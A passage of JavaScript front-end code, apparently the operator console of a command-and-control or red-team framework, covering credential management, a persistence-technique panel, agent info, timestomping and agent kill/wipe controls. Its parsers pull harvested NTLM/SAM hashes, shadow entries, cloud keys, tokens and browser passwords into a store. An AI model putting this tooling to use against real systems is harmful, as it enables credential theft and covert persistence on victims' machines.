          <button class="btn-sm btn-sm-ghost btn-sm-danger cred-del" title="Delete"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg></button>
        </td>
      </tr>`;
    }
    tbody.innerHTML = html;
  }

  function _openCredModal(existing = null) {
    const title = $('#cred-modal-title');
    if (title) title.textContent = existing ? 'Edit Credential' : 'Add Credential';
    $('#cred-edit-id').value = existing ? existing.id : '';
    $('#cred-f-user').value = existing ? existing.username : '';
    $('#cred-f-secret').value = existing ? existing.secret : '';
    $('#cred-f-type').value = existing ? (existing.secret_type || 'password') : 'password';
    $('#cred-f-source').value = existing ? existing.source : 'manual';
    $('#cred-f-domain').value = existing ? existing.domain : '';
    $('#cred-f-proto').value = existing ? existing.protocol : '';
    $('#cred-f-host').value = existing ? existing.host : '';
    $('#cred-f-port').value = existing ? existing.port : '';
    $('#cred-f-notes').value = existing ? existing.notes : '';
    Modal.open('cred-modal');
    setTimeout(() => $('#cred-f-user').focus(), 60);
  }

  function _showCredDetail(cred) {
    const grid = $('#cred-detail-grid');
    if (!grid) return;
    const fields = [
      ['Source', cred.source],
      ['Protocol', cred.protocol],
      ['Host', (cred.host || '') + (cred.port ? ':' + cred.port : '')],
      ['Domain', cred.domain],
      ['Notes', cred.notes],
      ['Username', cred.username],
      ['Secret', cred.secret],
      ['Type', cred.secret_type],
    ];
    grid.innerHTML = fields.map(([label, val]) => {
      const isSec = label === 'Secret';
      return `<div class="cred-detail-label">${escHtml(label)}</div>` +
        `<div class="${isSec ? 'cred-detail-secret' : 'cred-detail-val'}">${escHtml(val || '—')}</div>`;
    }).join('');
    const copyBtn = $('#cred-detail-copy');
    if (copyBtn) {
      copyBtn.onclick = () => {
        navigator.clipboard.writeText(cred.secret || '').then(() => Toast.show('ok', 'Copied to clipboard'));
      };
    }
    Modal.open('cred-show-modal');
  }

  async function _saveCred() {
    const editId = $('#cred-edit-id').value;
    const data = {
      username:    $('#cred-f-user').value.trim(),
      secret:      $('#cred-f-secret').value.trim(),
      secret_type: $('#cred-f-type').value,
      source:      $('#cred-f-source').value.trim() || 'manual',
      domain:      $('#cred-f-domain').value.trim(),
      protocol:    $('#cred-f-proto').value.trim(),
      host:        $('#cred-f-host').value.trim(),
      port:        $('#cred-f-port').value.trim(),
      notes:       $('#cred-f-notes').value.trim(),
    };
    if (!data.username || !data.secret) {
      Toast.show('error', 'Username and secret are required');
      return;
    }
    try {
      if (editId) {
        await API.updateCredential(_activeId, editId, data);
      } else {
        await API.addCredential(_activeId, data);
      }
      Modal.close('cred-modal');
      Toast.show('ok', editId ? 'Credential updated' : 'Credential added');
      _loadCreds();
    } catch (e) {
      Toast.show('error', 'Failed to save', e.message || '');
    }
  }

  async function _deleteCred(credId) {
    try {
      await API.deleteCredential(_activeId, credId);
      Toast.show('ok', 'Credential deleted');
      _loadCreds();
    } catch (e) {
      Toast.show('error', 'Failed to delete', e.message || '');
    }
  }

  function _credsAutoExtract(content, sessionId) {
    if (!content || !sessionId) return;
    const creds = [];
    let m;
    const src = content.includes('[creds harvest]') ? 'harvest'
              : content.includes('[creds sam]') ? 'sam'
              : content.includes('[creds coerce]') ? 'coerce'
              : 'listen';

    // ── Listen dump: "[PROTO:PORT] N credentials" headers followed by indented entries
    const isDump = /^\[([\w-]+):(\d+)\]\s+\d+\s+credential/im.test(content);
    if (isDump) {
      const lines = content.split('\n');
      let curProto = '', curPort = '';
      for (const line of lines) {
        const hdr = line.match(/^\[([\w-]+):(\d+)\]\s+\d+\s+credential/i);
        if (hdr) {
          const raw = hdr[1].toLowerCase();
          curProto = raw.includes('ntlm') ? 'http-ntlm' : raw.includes('http') ? 'http' : 'smb';
          curPort = hdr[2];
          continue;
        }
        if (!line.startsWith('  ') || !line.trim()) continue;
        const trimmed = line.trim();
        // HTTP-Basic entry: "[HTTP-Basic] user:pass (from IP)"
        const bm = trimmed.match(/^\[HTTP-Basic\]\s+([^:]+):(.+?)\s+\(from\s+([^)\s]+)\)/);
        if (bm) {
          creds.push({ username: bm[1], secret: bm[2], secret_type: 'basic', source: 'listen', protocol: curProto || 'http', host: bm[3], port: curPort });
          continue;
        }
        // NTLMv2 entry: "user::DOMAIN:challenge:NTProofStr:blob"
        const nm = trimmed.match(/^(\S+?::[\w.-]+?:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+)/i);
        if (nm) {
          const full = nm[1];
          const parts = full.split('::');
          const user = parts[0];
          const domain = parts[1] ? parts[1].split(':')[0] : '';
          creds.push({ username: user, secret: full, secret_type: 'ntlmv2', domain, source: 'listen', protocol: curProto || 'smb', port: curPort });
          continue;
        }
      }
    }

    // NTLMv2 hashes (non-dump context: coerce, harvest): "user::DOMAIN:challenge:response:blob"
    if (src !== 'listen') {
      const ntlmv2Re = /^\s*(\S+?::[\w.-]+?:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+)/gim;
      const _s2 = _sessions[sessionId] || {};
      while ((m = ntlmv2Re.exec(content)) !== null) {
        const full = m[1];
        const parts = full.split('::');
        const user = parts[0];
        const domain = parts[1] ? parts[1].split(':')[0] : '';
        creds.push({ username: user, secret: full, secret_type: 'ntlmv2', domain, source: src, protocol: 'smb', host: _s2.target_host || '' });
      }
    }

    // HTTP Basic outside listen dump (standalone format)
    if (src !== 'listen') {
      const basicRe = /\[HTTP-Basic\]\s+([^:]+):(.+?)\s+\(from\s+([^)\s]+)\)/g;
      while ((m = basicRe.exec(content)) !== null) {
        creds.push({ username: m[1], secret: m[2], secret_type: 'basic', source: src, protocol: 'http', host: m[3] || '' });
      }
    }

    // SAM hashes: "  Administrator:500:aad3b435...:31d6cfe0..:::
    const samRe = /^\s+([\w$]+):(\d+):[0-9a-f]{32}:([0-9a-f]{32}):::/gm;
    const _s = _sessions[sessionId] || {};
    while ((m = samRe.exec(content)) !== null) {
      creds.push({ username: m[1], secret: m[0].trim(), secret_type: 'ntlm', source: 'sam', protocol: 'ntlm',
        host: _s.target_host || '', domain: _s.target_domain || '', notes: `RID:${m[2]}` });
    }

    // /etc/shadow: "    user:$type$salt$hash:..."
    const shadowRe = /^\s{4}([\w._-]+):(\$\d+\$[^:]+):/gm;
    const _s3 = _sessions[sessionId] || {};
    while ((m = shadowRe.exec(content)) !== null) {
      creds.push({ username: m[1], secret: m[0].trim(), secret_type: 'hash', source: 'harvest', protocol: 'linux', host: _s3.target_host || '', notes: '/etc/shadow' });
    }

    // Git credentials: "    https://user:token@host..."
    const gitRe = /^\s{4}https?:\/\/([^:]+):([^@]+)@(\S+)/gm;
    while ((m = gitRe.exec(content)) !== null) {
      creds.push({ username: m[1], secret: m[2], secret_type: 'token', source: 'harvest', protocol: 'https', host: m[3], notes: 'Git' });
    }

    // AWS credentials: "    [profile] aws_access_key_id = AKIA..."
    const awsKeyRe = /aws_access_key_id\s*=\s*(\S+)/gi;
    const awsSecRe = /aws_secret_access_key\s*=\s*(\S+)/gi;
    const awsTokRe = /aws_session_token\s*=\s*(\S+)/gi;
    const awsKeys = []; const awsSecs = []; const awsToks = [];
    while ((m = awsKeyRe.exec(content)) !== null) awsKeys.push(m[1]);
    while ((m = awsSecRe.exec(content)) !== null) awsSecs.push(m[1]);
    while ((m = awsTokRe.exec(content)) !== null) awsToks.push(m[1]);
    for (let i = 0; i < awsKeys.length; i++) {
      creds.push({ username: awsKeys[i], secret: awsSecs[i] || '(see harvest output)', secret_type: 'token', source: 'harvest', protocol: 'aws', notes: 'AWS IAM access key' });
    }
    for (let i = 0; i < awsToks.length; i++) {
      creds.push({ username: awsKeys[i] || 'session', secret: awsToks[i], secret_type: 'token', source: 'harvest', protocol: 'aws', notes: 'AWS session token' });
    }

    // SSH keys: "    name (PLAINTEXT)" — plaintext private keys staged to artifacts
    const sshKeyRe = /^\s{4}(\S+)\s+\(PLAINTEXT\)/gm;
    while ((m = sshKeyRe.exec(content)) !== null) {
      creds.push({ username: m[1], secret: '(download from artifacts)', secret_type: 'ssh_key', source: 'harvest', protocol: 'ssh', notes: 'PLAINTEXT key' });
    }

    // Section-aware parsing for pipe-delimited and arrow-delimited formats
    // (Chrome/Edge/Firefox/DPAPI use "target | user | pass", Docker/WiFi use "X → Y")
    const sections = content.split(/^  ───/gm);
    for (const sec of sections) {
      // Browser/DPAPI pipe format
      if (/Chrome Passwords|Edge Passwords|Firefox Passwords|DPAPI Credentials/i.test(sec)) {
        const note = /Chrome/i.test(sec) ? 'Chrome' : /Edge/i.test(sec) ? 'Edge' : /Firefox/i.test(sec) ? 'Firefox' : 'DPAPI';
        const pipeRe = /^\s{2,4}(\S+)\s+\|\s+(\S+)\s+\|\s+(.+)/gm;
        while ((m = pipeRe.exec(sec)) !== null) {
          const target = m[1].trim();
          const user = m[2].trim();
          const secret = m[3].trim();
          if (!user || !secret || secret === '(empty)') continue;
          const isUrl = /^https?:\/\//.test(target);
          creds.push({
            username: user, secret, secret_type: 'password', source: 'harvest',
            protocol: isUrl ? 'http' : '', host: isUrl ? target.replace(/^https?:\/\//, '').split('/')[0] : target,
            notes: note,
          });
        }
      }
      // Docker: "registry → user:pass"
      if (/Docker/i.test(sec)) {
        const arrowRe = /^\s{2,4}(\S+)\s+→\s+(.+)/gm;
        while ((m = arrowRe.exec(sec)) !== null) {
          const val = m[2].trim();
          const [user, pass] = val.includes(':') ? val.split(':', 2) : [val, ''];
          if (user) creds.push({ username: user, secret: pass || val, secret_type: 'password', source: 'harvest', protocol: 'docker', host: m[1].trim(), notes: 'Docker registry' });
        }
      }
      // WiFi: "SSID → PSK"
      if (/WiFi/i.test(sec)) {
        const arrowRe = /^\s{2,4}(.+?)\s+→\s+(\S+)/gm;
        while ((m = arrowRe.exec(sec)) !== null) {
          creds.push({ username: m[1].trim(), secret: m[2].trim(), secret_type: 'password', source: 'harvest', protocol: 'wifi', notes: 'WiFi' });
        }
      }
    }

    if (!creds.length) return;

    // Dedup against existing cache
    const existing = _credsCache[sessionId] || [];
    const newCreds = creds.filter(c => {
      return !existing.some(e => e.username === c.username && e.secret === c.secret);
    });

    for (const c of newCreds) {
      API.addCredential(sessionId, c).catch(() => {});
    }
    if (newCreds.length) {
      setTimeout(() => { if ($('#tp-creds.on')) _loadCreds(); }, 300);
    }
  }

  function _renderPersist() {
    const inner = $('#persist-inner');
    if (!inner || !_activeId) return;

    // If no probe data in memory, try loading from history (survives server/browser restart)
    if (!_persistProbeData[_activeId] || !Object.keys(_persistProbeData[_activeId]).length) {
      _loadProbeFromHistory(_activeId);
      // Continue rendering with empty data (function will re-render when history loads)
    }

    const detectedOs = _detectPersistOs();

    /* ── no OS yet: show placeholder until first heartbeat ── */
    if (!detectedOs) {
      const s     = _sessions[_activeId];
      const hasHb = !!(s?.last_seen_at || s?.last_hb_ts);
      inner.innerHTML = `
        <div class="persist-engine">
          <div class="persist-header">
            <div class="persist-title-row">
              <span class="persist-title">Persistence Engine</span>
              <span class="ps-os-chip ps-os-unk">OS unknown</span>
            </div>
          </div>
          <div class="ps-os-pending">
            <div class="ps-os-pending-msg">${
              hasHb
                ? 'OS could not be determined from the last heartbeat.'
                : 'Waiting for first heartbeat to determine target OS.'
            }</div>
            <div class="ps-os-pending-hint">The technique catalog and probe controls will appear once the agent checks in.</div>
          </div>
        </div>`;
      return;
    }

    const probeData  = _persistProbeData[_activeId] || null;
    const catalog    = _PERSIST_CATALOG[detectedOs];

    if (!_persistSelections[_activeId]) _persistSelections[_activeId] = new Set();
    const sel      = _persistSelections[_activeId];
    const selCount = [...sel].filter(id => catalog.some(t => t.id === id)).length;
    const allSel   = catalog.length > 0 && catalog.every(t => sel.has(t.id));

    /* ── helpers ── */
    const S = n => '★'.repeat(n) + '☆'.repeat(3 - n);
    const stealthN = v => ({ high: 3, medium: 2, low: 1 }[v] || 1);
    const impactN  = v => ({ low: 1, medium: 2, high: 3 }[v] || 1);  // more stars = heavier footprint
    const opsecN   = v => stealthN(v);                                 // more stars = safer

    const starsHtml = (n, cls, tip) =>
      `<span class="ps-stars ${cls}" data-n="${n}" title="${escHtml(tip)}">${S(n)}</span>`;

    const statusBadge = s => {
      if (!s) return `<span class="ps-badge ps-unknown">—</span>`;
      const cls = { installed: 'ps-installed', partial: 'ps-partial', available: 'ps-available', unavailable: 'ps-unavailable' }[s] || 'ps-unknown';
      return `<span class="ps-badge ${cls}">${s}</span>`;
    };

    const osLabel = detectedOs === 'windows' ? 'Windows' : detectedOs === 'linux' ? 'Linux' : 'unknown';
    const osCls   = detectedOs === 'windows' ? 'ps-os-win' : detectedOs === 'linux' ? 'ps-os-lin' : 'ps-os-unk';

    /* ── table rows ── */
    const rows = catalog.map(t => {
      const probe      = probeData ? probeData[t.id] : null;
      const status     = probe?.status || null;
      const checked    = sel.has(t.id);
      const installDis = status === 'unavailable' ? 'disabled' : '';
      const removeDis  = (!status || status === 'available' || status === 'unavailable') ? 'disabled' : '';
      const isUser     = t.priv === 'user';
      const privLabel  = isUser ? 'User' : (detectedOs === 'windows' ? 'Admin' : 'Root');
      const privNote   = isUser ? 'no escalation' : (detectedOs === 'windows' ? 'UAC required' : 'sudo required');
      const isBoot     = t.trigger.includes('boot');
      const sn = stealthN(t.stealth), im = impactN(t.impact), op = opsecN(t.stealth);

      return `<tr class="ps-row ${checked ? 'ps-row-sel' : ''}" data-tid="${escHtml(t.id)}">
        <td class="ps-col-cb">
          <input type="checkbox" class="ps-cb" ${checked ? 'checked' : ''}
            onchange="Sessions.togglePersistSelect('${t.id}')">
        </td>
        <td class="ps-col-name">
          <div class="ps-tname">${escHtml(t.name)}</div>
          <code class="ps-tid">${escHtml(t.id)}</code>
        </td>
        <td class="ps-col-desc" title="${escHtml(t.desc)}">${escHtml(t.desc)}</td>
        <td class="ps-col-priv">
          <span class="ps-priv ${isUser ? 'ps-priv-user' : 'ps-priv-root'}">${privLabel}</span>
          <div class="ps-priv-note">${privNote}</div>
        </td>
        <td class="ps-col-trig">
          <span class="ps-trig ${isBoot ? 'ps-tb' : 'ps-tl'}">${escHtml(t.trigger)}</span>
        </td>
        <td class="ps-col-stars">${starsHtml(sn, 'ps-si', `Stealth: ${t.stealth} — ${sn}/3`)}</td>
        <td class="ps-col-stars">${starsHtml(im, 'ps-ip', `Impact: ${t.impact} — ${im}/3 (more = heavier footprint)`)}</td>
        <td class="ps-col-stars">${starsHtml(op, 'ps-op', t.opsec)}</td>
        <td class="ps-col-status">${statusBadge(status)}</td>
        <td class="ps-col-act">
          <button class="btn-xs ps-install" ${installDis}
            onclick="Sessions.doPersistInstall('${t.id}')">Install</button>
          <button class="btn-xs ps-remove" ${removeDis}
            onclick="Sessions.doPersistRemove('${t.id}')">Remove</button>
          <button class="btn-xs ps-check"
            onclick="Sessions.doPersistStatus('${t.id}')">Status</button>
        </td>
      </tr>`;
    }).join('');

    const probeSelLabel = selCount > 0 ? `Probe (${selCount})` : 'Probe Selected';

    inner.innerHTML = `
      <div class="persist-engine">
        <div class="persist-header">
          <div class="persist-title-row">
            <span class="persist-title">Persistence Engine</span>
            <span class="ps-os-chip ${osCls}">${osLabel}</span>
          </div>
          <div class="persist-hdr-right">
            <label class="ps-sel-all">
              <input type="checkbox" id="ps-sel-all" ${allSel ? 'checked' : ''}
                onchange="Sessions.togglePersistSelectAll()">
              <span class="ps-sel-all-lbl">${selCount > 0 ? selCount + ' selected' : 'Select all'}</span>
            </label>
            <button class="btn-action secondary" ${!selCount ? 'disabled' : ''}
              onclick="Sessions.doPersistProbeSelected()">${probeSelLabel}</button>
            <button class="btn-action primary" id="ps-probe-btn"
              onclick="Sessions.doPersistProbeAll()">Probe All</button>
          </div>
        </div>
        <div class="ps-table-wrap">
          <table class="persist-table ps-tech-table">
            <thead><tr>
              <th class="ps-th-cb"></th>
              <th>Technique</th>
              <th>Description</th>
              <th>Privilege</th>
              <th>Trigger</th>
              <th title="Detection difficulty — ★★★ very hard to detect">Stealth</th>
              <th title="Artifacts left on target — ★★★ heavy footprint">Impact</th>
              <th title="Operational safety — hover for notes (★★★ safest)">OPSEC</th>
              <th>Status</th>
              <th class="ps-th-act">Actions</th>
            </tr></thead>
            <tbody>${rows || `<tr><td colspan="10" class="persist-empty">No techniques for this OS.</td></tr>`}</tbody>
          </table>
        </div>
        ${selCount ? `<div class="persist-bulk">
          <span class="persist-bulk-label">${selCount} technique${selCount !== 1 ? 's' : ''} selected</span>
          <button class="btn-action secondary" onclick="Sessions.doPersistInstallSelected()">Install Selected</button>
          <button class="btn-action danger" onclick="Sessions.doPersistRemoveSelected()">Remove Selected</button>
        </div>` : ''}
      </div>`;
    // Re-attach col resize after innerHTML rebuild
    const persistTbl = inner.querySelector('.ps-tech-table');
    if (persistTbl) _initColResize(persistTbl, 'colw:persist-table');
  }

  /* ── info tab ────────────────────────────────────────────────────────────── */

  function _parseSysinfo(text) {
    if (!text) return null;

    // Detect OS family from content (Boot Time is Windows-only field)
    const isWindows = /Boot Time\s*:/i.test(text) || /Win32_OperatingSystem/i.test(text);

    const r = {
      _os: isWindows ? 'windows' : 'linux',
      _fields: [],  // Keep all key:value pairs in order
    };

    // Extract key:value pairs from SYSTEM INFO and HARDWARE sections
    const lines = text.split('\n');
    const _keyValSections = new Set(['system info', 'hardware']);
    let _curSection = null;
    for (const line of lines) {
      const secM = line.match(/^=== (.+?) ===/i);
      if (secM) { _curSection = secM[1].toLowerCase(); continue; }
      if (!_keyValSections.has(_curSection)) continue;

      const m = line.match(/^([^:]+):\s*(.+)/);
      if (m) {
        const key = m[1].trim();
        const value = m[2].trim();
        r._fields.push({ key, value });
        r[key.toLowerCase().replace(/\s+/g, '_')] = value;
      }
    }

    const block = (header) => {
      const m = text.match(new RegExp('=== ' + header + ' ===([\\s\\S]*?)(?:===|$)', 'i'));
      return m ? m[1].split('\n').map(l => l.trim()).filter(l => l) : [];
    };
    r.network = block('NETWORK');
    r.av      = block('AV/EDR');
    r.firewall = block('FIREWALL');
    r.selinux = block('SELINUX');
    r.containers = block('CONTAINER');
    r.tools = block('NET TOOLS');

    return (r._fields.length > 0) ? r : null;
  }

  function _cell(label, value) {
    return `<div class="info-cell"><div class="info-k">${label}</div><div class="info-v">${escHtml(value||'—')}</div></div>`;
  }

  function _renderInfo() {
    const inner = $('#info-inner');
    if (!inner || !_activeId) return;
    const s = _sessions[_activeId];
    if (!s) return;

    const st = _sessionStatus(s);

    const privBadge = s.target_privs && ['root','SYSTEM','admin','Administrator'].includes(s.target_privs)
      ? ` <span class="info-badge-priv">${escHtml(s.target_privs)}</span>` : '';

    const _isP2P = !!s.p2p_is_internal;
    const _srcNote = _isP2P ? 'from P2P checkin' : 'from heartbeat';

    inner.innerHTML = `
      <div class="info-section">
        <div class="info-section-title">Identity <span class="info-title-note">${_srcNote}</span></div>
        <div class="info-grid">
          ${_cell('Session ID', _activeId)}
          ${_cell('Status', '')}
          ${_cell('Hostname', s.target_host)}
          ${_cell('OS', s.target_os)}
          ${_cell('Username', s.target_user ? s.target_user + (s.target_privs ? ` (${s.target_privs})` : '') : null)}
          ${_cell('Domain', s.target_domain)}
          ${_cell('Internal IP', s.target_ip)}
          ${_cell('External IP', s.target_ip_ext)}
          ${s.locked ? '<div class="info-cell"><div class="info-k">Lock</div><div class="info-v" style="color:#3b82f6">🔒 Locked — kill/stop/delete disabled</div></div>' : ''}
        </div>
      </div>

      <div class="info-section">
        <div class="info-section-title">Agent <span class="info-title-note">${_srcNote}</span></div>
        <div class="info-grid">
          ${_cell('PID', s.agent_pid)}
          ${_cell('Process', s.agent_process)}
          ${_isP2P ? _cell('Connection', 'Persistent TCP (∞)') : _cell('Last Heartbeat', '')}
          ${_isP2P ? _cell('Parent', s.p2p_parent_guid ? s.p2p_parent_guid.slice(0, 8) + '…' : '—') : _cell('Sleep / Jitter', s.agent_sleep != null ? `${_fmtDuration(s.agent_sleep)} ± ${s.agent_jitter ?? '?'}%` : null)}
        </div>
      </div>

      ${_isP2P ? '' : `<div class="info-section">
        <div class="info-section-title">Dead-Drop Channel <span class="info-title-note">from heartbeat</span></div>
        <div class="info-grid">
          ${_cell('Provider', _providerLabel(s.provider))}
          ${_cell('Deploy Mode', s.deploy_mode)}
          ${_cell('Folder Name', s.folder_path ? s.folder_path.replace(/^\/+|\/+$/g, '').split('/').pop() : null)}
          ${_cell('Folder Path', s.folder_path)}
          ${_cell('Input File', s.input_file?.replace(/^\/+/, ''))}
          ${_cell('Output File', s.output_file?.replace(/^\/+/, ''))}
          ${_cell('Heartbeat File', s.heartbeat_file?.replace(/^\/+/, ''))}
          ${_cell('Label', s.label)}
          ${(s.s2_uploaded_at && !s.s2_deleted) ? `<div class="info-cell"><div class="info-k">Stage2</div><div class="info-v" style="color:var(--warn,#e6a817)" title="Stage2 still on cloud — server cancels it at first heartbeat">⚠ On cloud since ${new Date(s.s2_uploaded_at).toLocaleTimeString()}</div></div>` : ''}
        </div>
      </div>`}

      <div class="info-section">
        <div class="info-section-title">Guardrails <span class="info-title-note">baked at deploy time</span></div>
        <div class="info-grid">
          ${s.kill_date ? `<div class="info-cell"><div class="info-k">Kill Date</div><div class="info-v" style="color:var(--danger,#e05252)">${escHtml(s.kill_date)}</div></div>` : _cell('Kill Date', null)}
          ${_cell('Window', (s.window_start && s.window_end) ? `${s.window_start} → ${s.window_end}` : null)}
          ${(() => {
            const sv = window._serverVersion || '';
            const av = s.stratum_version || '';
            if (av && sv && av !== sv) return `<div class="info-cell"><div class="info-k">Deployed With</div><div class="info-v" style="color:var(--warn,#e6a817)" title="Server is v${escHtml(sv)} — consider re-deploying this agent">⚠ v${escHtml(av)}</div></div>`;
            return _cell('Deployed With', av ? `v${av}` : null);
          })()}
        </div>
      </div>

      <div class="info-section" id="info-sysinfo-section">
        <div class="info-section-title">System Intelligence <span class="info-title-note">from /sysinfo</span></div>
        <div id="info-sysinfo-body" class="info-sysinfo-empty">
          <span class="info-sysinfo-hint">Run <code>/sysinfo</code> in the shell to populate this section.</span>
        </div>
      </div>`;

    // fill live values
    const dispTs = String(s._localSeenAt || s.last_seen_at || s.last_hb_ts || '');
    const stEl = inner.querySelector('.info-grid .info-cell:nth-child(2) .info-v');
    if (stEl) stEl.innerHTML = st;

    // find the "Last Heartbeat" cell by label and set it
    inner.querySelectorAll('.info-cell').forEach(cell => {
      const k = cell.querySelector('.info-k');
      const v = cell.querySelector('.info-v');
      if (!k || !v) return;
      if (k.textContent === 'Last Heartbeat') {
        v.id = 'info-hb-val';
        v.textContent = fmtAge(dispTs);
      }
    });

    // async: load sysinfo from history (skip if agent never checked in)
    if (s.last_hb_ts || s.last_seen_at) {
      _loadSysinfoSection(_activeId);
    } else {
      const body = $('#info-sysinfo-body');
      if (body) body.innerHTML = `<div class="info-sysinfo-empty">
        <span class="info-sysinfo-dim">No check-in yet.</span>
        <span class="info-sysinfo-hint">Once the agent is live, run <code>/sysinfo</code> in the shell to populate this section.</span>
      </div>`;
    }
  }

  async function _loadSysinfoSection(sessionId) {
    // Pre-flight check before async gap
    let body = $('#info-sysinfo-body');
    if (!body) return;
    if (body.dataset.loaded === sessionId) return;
    try {
      const history = await API.history(sessionId);
      // Re-query after await — _renderInfo() may have rebuilt the DOM (heartbeat race)
      body = $('#info-sysinfo-body');
      if (!body) return;
      if (body.dataset.loaded === sessionId) return;  // another call already rendered
      // find last SYSINFO entry with a non-empty response
      const entry = [...(history || [])].reverse().find(h =>
        h.command === '/sysinfo' && h.response && h.response.trim()
      );
      if (!entry) {
        body.innerHTML = `<div class="info-sysinfo-empty">
          <span class="info-sysinfo-dim">No data yet.</span>
          <span class="info-sysinfo-hint">Run <code>/sysinfo</code> in the shell to populate this section.</span>
        </div>`;
        return;
      }
      const p = _parseSysinfo(entry.response);
      if (!p) {
        body.innerHTML = `<div class="info-sysinfo-empty"><span class="info-sysinfo-dim">Could not parse sysinfo output.</span></div>`;
        return;
      }
      // Build dynamic fields grid from all extracted key:value pairs
      const fieldsHtml = p._fields
        .map(({ key, value }) => _cell(key, value))
        .join('');

      // Build subsection HTML dynamically
      let subsectionsHtml = '';
      const addSubsection = (title, data) => {
        if (data && data.length) {
          const html = data.map(l => `<div class="info-v" style="font-size:.7rem">${escHtml(l)}</div>`).join('');
          subsectionsHtml += `<div class="info-sysinfo-sub">${title}</div><div style="padding:.2rem .9rem .6rem">${html}</div>`;
        }
      };

      addSubsection('Network Interfaces', p.network);
      addSubsection('AV / EDR', p.av);
      addSubsection('Firewall', p.firewall);
      addSubsection('SELinux', p.selinux);
      addSubsection('Container Tools', p.containers);
      addSubsection('Network Tools', p.tools);

      body.innerHTML = `
        <div class="info-sysinfo-ts">Captured: ${escHtml(entry.timestamp||'')} &nbsp;·&nbsp; ${p._os === 'windows' ? 'Windows' : 'Linux'}</div>
        <div class="info-grid">
          ${fieldsHtml}
        </div>
        ${subsectionsHtml}`;
      body.dataset.loaded = sessionId;
    } catch {
      body = $('#info-sysinfo-body');
      if (body) body.innerHTML = `<div class="info-sysinfo-empty"><span class="info-sysinfo-dim">Failed to load history.</span></div>`;
    }
  }

  function _renderControl() {
    const inner = $('#control-inner');
    if (!inner || !_activeId) return;
    const s = _sessions[_activeId];
    if (!s) return;

    inner.innerHTML = `
      <div class="info-section">
        <div class="info-section-title">Timing</div>
        <div class="sleep-controls">
          <div class="sc-group">
            <label>Sleep</label>
            <div class="sc-stepper">
              <button class="sc-step" onclick="Sessions.stepSleep(-10)">‹‹</button>
              <button class="sc-step" onclick="Sessions.stepSleep(-1)">‹</button>
              <input type="number" id="sleep-val" value="${s.agent_sleep != null ? s.agent_sleep : 30}" min="1" max="86400">
              <button class="sc-step" onclick="Sessions.stepSleep(1)">›</button>
              <button class="sc-step" onclick="Sessions.stepSleep(10)">››</button>
            </div>
            <span class="sc-unit">s</span>
            <button class="btn-apply" onclick="Sessions.doSleep()">Set</button>
          </div>
          <div class="sc-group">
            <label>Jitter</label>
            <div class="sc-stepper">
              <button class="sc-step" onclick="Sessions.stepJitter(-5)">‹‹</button>
              <button class="sc-step" onclick="Sessions.stepJitter(-1)">‹</button>
              <input type="number" id="jitter-val" value="${s.agent_jitter != null ? s.agent_jitter : 20}" min="0" max="50">
              <button class="sc-step" onclick="Sessions.stepJitter(1)">›</button>
              <button class="sc-step" onclick="Sessions.stepJitter(5)">››</button>
            </div>
            <span class="sc-unit">%</span>
            <button class="btn-apply" onclick="Sessions.doJitter()">Set</button>
          </div>
        </div>
      </div>

      <div class="info-section">
        <div class="info-section-title">Agent Actions</div>
        <div class="ctrl-action-list">
          <div class="ctrl-action-row">
            <div class="ctrl-action-info">
              <span class="ctrl-action-label">Stop Agent</span>
              <span class="ctrl-action-desc">Send EXIT to the agent — it stops executing immediately. No files are removed from the target. The session record remains here.</span>
            </div>
            <button class="btn-action danger" onclick="Sessions.doKillAgent()">Stop Agent</button>
          </div>
        </div>
      </div>

      <div class="info-section ctrl-wipe-section">
        <div class="info-section-title">Remove Session</div>
        <div class="ctrl-wipe-body">
          <p class="ctrl-wipe-desc">
            Performs a full teardown of this session:
          </p>
          <ul class="ctrl-wipe-list">
            <li>Sends <code>KILL</code> to the agent — wipes <em>enc_staged_agent</em>, persistence entries and stub from the target</li>
            <li>Removes the session from the manager and deletes its profile</li>
            <li>Optionally deletes the deployment directory (keys, stage2, artifacts) — operator choice</li>
            <li>Optionally deletes the command history log — operator choice</li>
          </ul>
          <p class="ctrl-wipe-warn">This action is irreversible. The agent cannot be recovered after cleanup.</p>
          <button class="btn-action danger ctrl-wipe-btn" onclick="Sessions.doWipeSession()">Remove &amp; Clean Up</button>
        </div>
      </div>`;
  }

  /* ── public actions ──────────────────────────────────────────────────────── */

  /* helper: log command in shell then call API; returns API response */
  async function _sendBuiltin(apiCall, displayCmd) {
    _switchTab('shell');
    const tmpId = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2));
    _appendOutput({ ts: new Date().toISOString(), command: displayCmd, cmd_id: tmpId, pending: true });
    try {
      const r = await apiCall();
      const finalId = (r?.cmd_id && r.cmd_id !== tmpId)
          ? (_promoteIdManual(tmpId, r.cmd_id), r.cmd_id)
          : tmpId;
      if (r?.ok !== false) _applyQueuedState(finalId, displayCmd);
      return r;
    } catch (e) {
      _setOutput(tmpId, `Error: ${e.message}`, true);
      throw e;
    }
  }

  async function doSysinfo() {
    if (!_activeId) return;
    try {
      const r = await _sendBuiltin(() => API.sysinfo(_activeId), '/sysinfo');
      if (r?.cmd_id && r?.ok !== false) _sysinfoRunning.add(r.cmd_id);
    } catch(e) { Toast.error('Sysinfo failed', e.message); }
  }

  async function doTimestomp() {
    if (!_activeId) return;
    const target = window.prompt('Timestomp — target file path:');
    if (!target) return;
    const ref = window.prompt('Reference file (leave empty to enter explicit time):');
    let payload;
    if (ref) {
      payload = { target, reference: ref };
    } else {
      const ts = window.prompt('Explicit timestamp (YYYY-MM-DD HH:MM):');
      if (!ts) return;
      payload = { target, explicit_time: ts };
    }
    try { await _sendBuiltin(() => API.timestomp(_activeId, payload), '/timestomp'); }
    catch(e) { Toast.error('Timestomp failed', e.message); }
  }

  async function doKillAgent() {
    if (!_activeId) return;
    const s = _sessions[_activeId];
    if (s && s.locked) { Toast.warning('Session locked', 'Unlock the session before stopping the agent'); return; }
    const ok = await confirm('Stop Agent', 'Send EXIT to the agent — it will stop executing. No files are removed from the target.');
    if (!ok) return;
    try {
      const r = await _sendBuiltin(() => API.sendCommand(_activeId, 'EXIT', '/stop'), '/stop');
      if (r?.cmd_id) _markFireAndForget(r.cmd_id, 'EXIT sent — agent stopped');
    }
    catch(e) { Toast.error('Stop Agent failed', e.message); }
  }

